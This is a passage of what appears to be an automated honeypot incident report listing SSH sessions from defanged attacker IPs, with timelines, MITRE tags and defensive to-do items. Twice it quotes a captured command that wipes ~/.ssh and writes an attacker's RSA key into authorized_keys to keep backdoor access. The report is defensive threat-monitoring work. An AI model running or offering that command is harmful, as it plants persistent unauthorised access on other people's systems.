| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:08:29` | `cowrie.session.connect` |
| `2026-07-09 08:08:29` | `cowrie.client.version` |
| `2026-07-09 08:08:29` | `cowrie.client.kex` |
| `2026-07-09 08:08:32` | `cowrie.login.success` |
| `2026-07-09 08:08:33` | `cowrie.session.params` |
| `2026-07-09 08:08:33` | `cowrie.command.input` |
| `2026-07-09 08:08:33` | `cowrie.command.failed` |
| `2026-07-09 08:08:34` | `cowrie.log.closed` |
| `2026-07-09 08:08:35` | `cowrie.session.params` |
| `2026-07-09 08:08:35` | `cowrie.command.input` |
| `2026-07-09 08:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.9[.]110` to AbuseIPDB if not already reported
- [ ] Block `121.229.9[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-845a84dd45a9

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-07-09 08:12 |
| **Last Seen** | 2026-07-09 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:12:00` | `cowrie.session.connect` |
| `2026-07-09 08:12:01` | `cowrie.client.version` |
| `2026-07-09 08:12:01` | `cowrie.client.kex` |
| `2026-07-09 08:12:03` | `cowrie.login.success` |
| `2026-07-09 08:12:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8016ff2ebba8

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-09 08:12 |
| **Last Seen** | 2026-07-09 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:12:10` | `cowrie.session.connect` |
| `2026-07-09 08:12:10` | `cowrie.client.version` |
| `2026-07-09 08:12:10` | `cowrie.client.kex` |
| `2026-07-09 08:12:13` | `cowrie.login.success` |
| `2026-07-09 08:12:13` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f608b3e1da

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-07-09 08:14 |
| **Last Seen** | 2026-07-09 08:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:14:04` | `cowrie.session.connect` |
| `2026-07-09 08:14:05` | `cowrie.client.version` |
| `2026-07-09 08:14:05` | `cowrie.client.kex` |
| `2026-07-09 08:14:07` | `cowrie.login.success` |
| `2026-07-09 08:14:08` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b54c8fd80a5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:14 |
| **Last Seen** | 2026-07-09 08:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:14:58` | `cowrie.session.connect` |
| `2026-07-09 08:14:59` | `cowrie.client.version` |
| `2026-07-09 08:14:59` | `cowrie.client.kex` |
| `2026-07-09 08:15:05` | `cowrie.login.success` |
| `2026-07-09 08:15:07` | `cowrie.session.params` |
| `2026-07-09 08:15:07` | `cowrie.command.input` |
| `2026-07-09 08:15:08` | `cowrie.log.closed` |
| `2026-07-09 08:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6114f5617c98

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-07-09 08:15 |
| **Last Seen** | 2026-07-09 08:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:15:35` | `cowrie.session.connect` |
| `2026-07-09 08:15:35` | `cowrie.client.version` |
| `2026-07-09 08:15:35` | `cowrie.client.kex` |
| `2026-07-09 08:15:37` | `cowrie.login.success` |
| `2026-07-09 08:15:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d7f206a90d4

| Field | Detail |
|---|---|
| **Source IP** | `117.34.85[.]168` |
| **First Seen** | 2026-07-09 08:16 |
| **Last Seen** | 2026-07-09 08:21 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:16:14` | `cowrie.session.connect` |
| `2026-07-09 08:16:14` | `cowrie.client.version` |
| `2026-07-09 08:16:15` | `cowrie.client.kex` |
| `2026-07-09 08:16:15` | `cowrie.login.success` |
| `2026-07-09 08:16:17` | `cowrie.session.params` |
| `2026-07-09 08:16:17` | `cowrie.command.input` |
| `2026-07-09 08:16:17` | `cowrie.command.failed` |
| `2026-07-09 08:16:18` | `cowrie.log.closed` |
| `2026-07-09 08:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.34.85[.]168` to AbuseIPDB if not already reported
- [ ] Block `117.34.85[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8b3253b560

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-07-09 08:17 |
| **Last Seen** | 2026-07-09 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:17:28` | `cowrie.session.connect` |
| `2026-07-09 08:17:29` | `cowrie.client.version` |
| `2026-07-09 08:17:29` | `cowrie.client.kex` |
| `2026-07-09 08:17:31` | `cowrie.login.success` |
| `2026-07-09 08:17:32` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a13b870521

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-09 08:17 |
| **Last Seen** | 2026-07-09 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:17:37` | `cowrie.session.connect` |
| `2026-07-09 08:17:38` | `cowrie.client.version` |
| `2026-07-09 08:17:38` | `cowrie.client.kex` |
| `2026-07-09 08:17:40` | `cowrie.login.success` |
| `2026-07-09 08:17:41` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9c6c67892e

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-07-09 08:20 |
| **Last Seen** | 2026-07-09 08:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:20:45` | `cowrie.session.connect` |
| `2026-07-09 08:20:45` | `cowrie.client.version` |
| `2026-07-09 08:20:45` | `cowrie.client.kex` |
| `2026-07-09 08:20:47` | `cowrie.login.success` |
| `2026-07-09 08:20:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7188122784c4

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-07-09 08:20 |
| **Last Seen** | 2026-07-09 08:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:20:59` | `cowrie.session.connect` |
| `2026-07-09 08:21:00` | `cowrie.client.version` |
| `2026-07-09 08:21:00` | `cowrie.client.kex` |
| `2026-07-09 08:21:02` | `cowrie.login.success` |
| `2026-07-09 08:21:03` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e02728f6b4

| Field | Detail |
|---|---|
| **Source IP** | `31.28.253[.]144` |
| **First Seen** | 2026-07-09 08:26 |
| **Last Seen** | 2026-07-09 08:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:26:00` | `cowrie.session.connect` |
| `2026-07-09 08:26:01` | `cowrie.client.version` |
| `2026-07-09 08:26:01` | `cowrie.client.kex` |
| `2026-07-09 08:26:02` | `cowrie.login.success` |
| `2026-07-09 08:26:03` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.28.253[.]144` to AbuseIPDB if not already reported
- [ ] Block `31.28.253[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7edfdb4177

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:26 |
| **Last Seen** | 2026-07-09 08:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:26:00` | `cowrie.session.connect` |
| `2026-07-09 08:26:01` | `cowrie.client.version` |
| `2026-07-09 08:26:01` | `cowrie.client.kex` |
| `2026-07-09 08:26:08` | `cowrie.login.success` |
| `2026-07-09 08:26:11` | `cowrie.session.params` |
| `2026-07-09 08:26:11` | `cowrie.command.input` |
| `2026-07-09 08:26:12` | `cowrie.log.closed` |
| `2026-07-09 08:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762c6396d518

| Field | Detail |
|---|---|
| **Source IP** | `112.184.21[.]53` |
| **First Seen** | 2026-07-09 08:26 |
| **Last Seen** | 2026-07-09 08:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:26:08` | `cowrie.session.connect` |
| `2026-07-09 08:26:09` | `cowrie.client.version` |
| `2026-07-09 08:26:09` | `cowrie.client.kex` |
| `2026-07-09 08:26:12` | `cowrie.login.success` |
| `2026-07-09 08:26:13` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.21[.]53` to AbuseIPDB if not already reported
- [ ] Block `112.184.21[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902e6254e9d6

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-07-09 08:29 |
| **Last Seen** | 2026-07-09 08:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:29:30` | `cowrie.session.connect` |
| `2026-07-09 08:29:30` | `cowrie.client.version` |
| `2026-07-09 08:29:30` | `cowrie.client.kex` |
| `2026-07-09 08:29:32` | `cowrie.login.success` |
| `2026-07-09 08:29:33` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d4b859032a3

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-09 08:32 |
| **Last Seen** | 2026-07-09 08:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:32:10` | `cowrie.session.connect` |
| `2026-07-09 08:32:10` | `cowrie.client.version` |
| `2026-07-09 08:32:10` | `cowrie.client.kex` |
| `2026-07-09 08:32:11` | `cowrie.login.success` |
| `2026-07-09 08:32:12` | `cowrie.session.params` |
| `2026-07-09 08:32:12` | `cowrie.command.input` |
| `2026-07-09 08:32:12` | `cowrie.command.failed` |
| `2026-07-09 08:32:12` | `cowrie.log.closed` |
| `2026-07-09 08:32:12` | `cowrie.session.params` |
| `2026-07-09 08:32:12` | `cowrie.command.input` |
| `2026-07-09 08:32:13` | `cowrie.session.file_download` |
| `2026-07-09 08:32:13` | `cowrie.log.closed` |
| `2026-07-09 08:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd62062e3e25

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-09 08:32 |
| **Last Seen** | 2026-07-09 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:32:13` | `cowrie.session.connect` |
| `2026-07-09 08:32:13` | `cowrie.client.version` |
| `2026-07-09 08:32:13` | `cowrie.client.kex` |
| `2026-07-09 08:32:13` | `cowrie.login.success` |
| `2026-07-09 08:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4596d7d0556b

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-09 08:32 |
| **Last Seen** | 2026-07-09 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:32:14` | `cowrie.session.connect` |
| `2026-07-09 08:32:14` | `cowrie.client.version` |
| `2026-07-09 08:32:14` | `cowrie.client.kex` |
| `2026-07-09 08:32:14` | `cowrie.login.success` |
| `2026-07-09 08:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2722b248a46a

| Field | Detail |
|---|---|
| **Source IP** | `216.218.206[.]67` |
| **First Seen** | 2026-07-09 08:34 |
| **Last Seen** | 2026-07-09 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:34:53` | `cowrie.session.connect` |
| `2026-07-09 08:34:53` | `cowrie.login.success` |
| `2026-07-09 08:34:54` | `cowrie.session.params` |
| `2026-07-09 08:34:54` | `cowrie.command.input` |
| `2026-07-09 08:34:54` | `cowrie.command.input` |
| `2026-07-09 08:34:54` | `cowrie.command.failed` |
| `2026-07-09 08:34:54` | `cowrie.command.input` |
| `2026-07-09 08:34:54` | `cowrie.command.failed` |
| `2026-07-09 08:34:54` | `cowrie.command.input` |
| `2026-07-09 08:34:54` | `cowrie.log.closed` |
| `2026-07-09 08:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.218.206[.]67` to AbuseIPDB if not already reported
- [ ] Block `216.218.206[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402bbc4b392b

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-09 08:36 |
| **Last Seen** | 2026-07-09 08:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:36:12` | `cowrie.session.connect` |
| `2026-07-09 08:36:12` | `cowrie.client.version` |
| `2026-07-09 08:36:12` | `cowrie.client.kex` |
| `2026-07-09 08:36:15` | `cowrie.login.success` |
| `2026-07-09 08:36:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7332b3fdc2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:36 |
| **Last Seen** | 2026-07-09 08:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:36:45` | `cowrie.session.connect` |
| `2026-07-09 08:36:46` | `cowrie.client.version` |
| `2026-07-09 08:36:46` | `cowrie.client.kex` |
| `2026-07-09 08:36:51` | `cowrie.login.success` |
| `2026-07-09 08:36:55` | `cowrie.session.params` |
| `2026-07-09 08:36:55` | `cowrie.command.input` |
| `2026-07-09 08:36:56` | `cowrie.log.closed` |
| `2026-07-09 08:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a44e2b5054

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 08:37 |
| **Last Seen** | 2026-07-09 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:37:43` | `cowrie.session.connect` |
| `2026-07-09 08:37:43` | `cowrie.client.version` |
| `2026-07-09 08:37:43` | `cowrie.client.kex` |
| `2026-07-09 08:37:44` | `cowrie.login.success` |
| `2026-07-09 08:37:44` | `cowrie.session.params` |
| `2026-07-09 08:37:44` | `cowrie.command.input` |
| `2026-07-09 08:37:44` | `cowrie.log.closed` |
| `2026-07-09 08:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d0d8cc7327

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-09 08:37 |
| **Last Seen** | 2026-07-09 08:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:37:47` | `cowrie.session.connect` |
| `2026-07-09 08:37:47` | `cowrie.client.version` |
| `2026-07-09 08:37:47` | `cowrie.client.kex` |
| `2026-07-09 08:37:50` | `cowrie.login.success` |
| `2026-07-09 08:37:50` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9621d96b83d6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 08:41 |
| **Last Seen** | 2026-07-09 08:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:41:14` | `cowrie.session.connect` |
| `2026-07-09 08:41:14` | `cowrie.client.version` |
| `2026-07-09 08:41:14` | `cowrie.client.kex` |
| `2026-07-09 08:41:15` | `cowrie.login.success` |
| `2026-07-09 08:41:15` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:41:15` | `cowrie.direct-tcpip.data` |
| `2026-07-09 08:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
